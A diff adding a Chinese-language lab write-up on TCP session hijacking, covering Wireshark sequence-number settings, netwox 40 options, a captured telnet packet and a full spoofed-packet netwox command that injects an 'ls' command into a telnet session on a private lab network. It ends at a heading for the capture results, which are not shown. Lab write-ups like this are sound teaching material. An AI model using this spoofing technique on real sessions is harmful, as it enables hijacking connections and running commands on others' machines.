@@ -208,7 +208,91 @@ gu@ubuntu:~$ Write failed: Broken pipe
 
 ### TCP会话劫持
 
+1. 会话劫持简介
+TCP会话劫持攻击的目标是通过向该会话中注入恶意内容来劫持两名受害者之间的现有TCP连接（会话）.  
+如果这个连接是一个telnet会话,攻击者可以在这个会话中注入恶意命令(例如删除重要文件),导致受害者执行恶意命令.  
 
+2. Wireshark简介
+如果您使用Wireshark观察网络流量,当Wireshark显示TCP序列号时,  
+默认情况下会显示相对序列号,它等于实际序列号减去初始序列号.  
+如果想查看包中的实际序列号,则需要右键单击Wireshark输出的TCP部分,  
+然后选择"Protocol Preference". 在弹出窗口中，取消选"Relative Sequence Number"选项.  
+
+3. Netwox 40简介
+```
+标题: Spoof Ip4Tcp packet
+用法: netwox 40 [-l ip] [-m ip] [-o port] [-p port] [-q uint32] [-B]
+参数:
+ -c|--ip4-tos uint32            IP4 tos {0}
+ -e|--ip4-id uint32             IP4 id (rand if unset) {0}
+ -f|--ip4-reserved|+f|--no-ip4-reserved IP4 reserved
+ -g|--ip4-dontfrag|+g|--no-ip4-dontfrag IP4 dontfrag
+ -h|--ip4-morefrag|+h|--no-ip4-morefrag IP4 morefrag
+ -i|--ip4-offsetfrag uint32     IP4 offsetfrag {0}
+ -j|--ip4-ttl uint32            IP4 ttl {0}
+ -k|--ip4-protocol uint32       IP4 protocol {0}
+ -l|--ip4-src ip                IP4 src {172.16.27.1}
+ -m|--ip4-dst ip                IP4 dst {5.6.7.8}
+ -n|--ip4-opt ip4opts           IPv4 options
+ -o|--tcp-src port              TCP src {1234}
+ -p|--tcp-dst port              TCP dst {80}
+ -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
+ -r|--tcp-acknum uint32         TCP acknum {0}
+ -s|--tcp-reserved1|+s|--no-tcp-reserved1 TCP reserved1
+ -t|--tcp-reserved2|+t|--no-tcp-reserved2 TCP reserved2
+ -u|--tcp-reserved3|+u|--no-tcp-reserved3 TCP reserved3
+ -v|--tcp-reserved4|+v|--no-tcp-reserved4 TCP reserved4
+ -w|--tcp-cwr|+w|--no-tcp-cwr   TCP cwr
+ -x|--tcp-ece|+x|--no-tcp-ece   TCP ece
+ -y|--tcp-urg|+y|--no-tcp-urg   TCP urg
+ -z|--tcp-ack|+z|--no-tcp-ack   TCP ack
+ -A|--tcp-psh|+A|--no-tcp-psh   TCP psh
+ -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
+ -C|--tcp-syn|+C|--no-tcp-syn   TCP syn
+ -D|--tcp-fin|+D|--no-tcp-fin   TCP fin
+ -E|--tcp-window uint32         TCP window {0}
+ -F|--tcp-urgptr uint32         TCP urgptr {0}
+ -G|--tcp-opt tcpopts           TCP options
+ -H|--tcp-data mixed_data       mixed data
+
+```
+我们要伪造发下一个包:  
+所以直接采用nextseq作为下一个包的ack,采用ack作为下一个包的seq.  
+最后一个Telnet数据包内容如下:  
+```
+Frame 19: 96 bytes on wire (768 bits), 96 bytes captured (768 bits) on interface 0
+Ethernet II, Src: Vmware_19:48:a4 (00:0c:29:19:48:a4), Dst: Vmware_32:0c:ee (00:0c:29:32:0c:ee)
+Internet Protocol Version 4, Src: 192.168.59.146, Dst: 192.168.59.148
+Transmission Control Protocol, Src Port: 23, Dst Port: 60256, Seq: 3387707651, Ack: 1507638819, Len: 30
+    Source Port: 23
+    Destination Port: 60256
+    [Stream index: 0]
+    [TCP Segment Len: 30]
+    Sequence number: 3387707651
+    [Next sequence number: 3387707681]
+    Acknowledgment number: 1507638819
+    Header Length: 32 bytes
+    Flags: 0x018 (PSH, ACK)
+    Window size value: 227
+    [Calculated window size: 227]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0x141f [unverified]
+    [Checksum Status: Unverified]
+    Urgent pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+    [SEQ/ACK analysis]
+        [Bytes in flight: 30]
+        [Bytes sent since last PSH flag: 30]
+Telnet
+```
+我们伪造向服务器`192.168.59.146`发送`ls `命令,  
+将`ls`转换成16进制并加上`\r`的16进制数得到`6c730d00`,  
+通过netwox构造我们的攻击指令如下:  
+`
+netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.59.148 --ip4-dst 192.168.59.146 --tcp-src 60256 --tcp-dst 23 --tcp-seqnum 1507638819 --tcp-acknum 3387707681 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "6c730d00"
+`  
+
+在wireshark上显示抓包数据如下:
 
 
 
